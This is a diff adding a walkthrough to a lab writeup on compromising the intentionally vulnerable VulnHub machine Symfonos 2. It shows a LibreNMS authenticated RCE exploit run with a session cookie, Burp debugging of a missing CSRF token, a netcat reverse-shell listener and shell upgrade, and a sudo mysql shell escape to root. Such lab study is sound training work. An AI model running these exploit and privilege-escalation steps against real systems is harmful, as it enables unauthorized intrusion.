@@ -15,7 +15,7 @@ layout: default
 
     <h2>Summary</h2>
 
-    <p></p>
+    <p>The SMB server contains a file called "log.txt".  This log file contains SMB share configuration settings and reveals the username aeolus.  We bruteforce the password for aeolus using ftp and login through SSH using those same credentials.  Once on the box we find a web server hosting LibreNMS listening internally on port 8080.  We forward this to our box and are able to login to LibreNMS using the credentaisl for aeolus.  There is an authenticated RCE expoit on searchsploit that works.  We need to intercept server responses to to troubleshoot the exploit to get it to work.  We gain shell access for the user cronos.  Cronos has sudo right to the command "mysql".  GTFObins contains a privesc command thats gives us a root shell.</p>
 
     <h2>Port Scanning</h2>
 
@@ -100,8 +100,50 @@ layout: default
 
     <img src="../images/symfonos_2/librenms.png">
 
+    <li>We are able to login here by reusing the credentials aeolus:sergioteamo.  When we check searchsploit for any exploits for LibreNMS we find a few.</li>
 
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit librenms&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;LibreNMS - addhost Command Injection (Metasploit)                                  | linux/remote/46970.rb&#13;&#10;LibreNMS - Collectd Command Injection (Metasploit)                                 | linux/remote/47375.rb&#13;&#10;LibreNMS 1.46 - &apos;addhost&apos; Remote Code Execution                                    | php/webapps/47044.py&#13;&#10;LibreNMS 1.46 - &apos;search&apos; SQL Injection                                             | multiple/webapps/48453.txt&#13;&#10;LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                   | multiple/webapps/49246.py&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results
+    </pre>
 
+    <li>I played with each exploit (except metasploit) but ended up using "LibreNMS 1.46 - 'addhost' Remote Code Execution".  This exploit creates a "device" on LibreNMS that contains a payload with a reverse shell command.  The exploit created the device successfully but it failed to execute the payload after creation.</li>
 
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ python ./LibreNMS-exploit.py http://127.0.0.1:800 librenms_session=eyJpdiI6IjErNEU2ZjVzaXlYQ29rWUFMck9mWmc9PSIsInZhbHVlIjoibmtzb1E2eGExeWZMSGhkSVR4T0s2VjdGOUFGUWpyWlUwcFoxT0ZvZHN5azg1WXhwT0JqNFhcLzk0RXN4cjFnQW9aTTFyWEErRlZDOEY5TUJDdXdsNW9nPT0iLCJtYWMiOiI1MWYxOGIwZDg5MmZiYThjY2Y5ZWZkYjc0ZjM1MzQ1ZjFjMjgwM2Y5OWQwNzkxOTE2ZGFmZDRiZWRmMzAyNGZhIn0%3D 10.0.0.1 80  &#13;&#10;[+] Device Created Sucssfully
+    </pre>
+
+    <li>In order to see what was happening when the the script was attempting to execute the payload I intercepted the server requests using Burp.  In order to do this you go to Burp > Proxy > Options > Proxy Listeners > Edit 127.0.0.1:8080 > Request Handling > Redirect to host: 127.0.0.1 > Redirect to port: (forwarded port for syfonos2:8080)</li>
+
+    <img src="../images/symfonos_2/burp_intercept_settings.png")>
+
+    <li>Now I try the exploit again and observe what is happening when the script attempts to execute the payload..</li>
+
+    <img src="../images/symfonos_2/burp_response_unauthenticated.png">
+
+    <h2>Privesc - Cronos</h2>
+
+    <li>As we can see. the server is responding with "unauthenticated" when it attempts to execute the payload.  In order to fix this, I first remove the Burp settings that are forwarding requests from 8080 to LibreNMS.  These settings are no longer required.  Then, I browse to http://127.0.0.1:800/ajax_output.php?hostname=dummydevice2&type=snmpwalk&id=capture&format=text just like the exploit was attempting to do.  I also intercept this request with burp so that I can compare the differences between the request I am sending to the web server and the request that the exploit it sending to the web server.  It turns out that the exploit was not including the CSRF token so we were getting the "unauthenticated" message instead of executing the payload.  When we browse to that URL manually, the payload executes successfully.</li>
+
+    <br>
+
+    <li>Now I have a new shell as the user Cronos.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 80                                                                                                130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::80&#13;&#10;Ncat: Listening on 0.0.0.0:80&#13;&#10;Ncat: Connection from 10.0.0.14.&#13;&#10;Ncat: Connection from 10.0.0.14:34152.&#13;&#10;/bin/sh: 0: can&apos;t access tty; job control turned off&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;cronus@symfonos2:/opt/librenms/html$ export TERM=xterm&#13;&#10;export TERM=xterm&#13;&#10;cronus@symfonos2:/opt/librenms/html$ ^Z&#13;&#10;zsh: suspended  nc -lvnp 80&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ stty raw -echo;fg;                                                                                     148 &Cross; 1 &#9881;&#13;&#10;[1]  + continued  nc -lvnp 80
+    </pre>
+
+    <li>On cronos I run sudo -l and find I have sudo access to /usr/bin/mysql as the user root.</li>
+
+    <pre>
+cronus@symfonos2:/opt/librenms/html$ sudo -l&#13;&#10;Matching Defaults entries for cronus on symfonos2:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&#13;&#10;&#13;&#10;User cronus may run the following commands on symfonos2:&#13;&#10;    (root) NOPASSWD: /usr/bin/mysql
+    </pre>
 
     <h2>Privesc - Root</h2>
+
+    <li>I take a look at GTFOBins and it tells me that I can use the command "sudo mysql -e '\! /bin/sh'" to privesc to root.</li>
+
+    <pre>
+cronus@symfonos2:/opt/librenms/html$ sudo mysql -e &apos;\! /bin/sh&apos;&#13;&#10;# id&#13;&#10;uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+
+    <li>Rooted.</li>
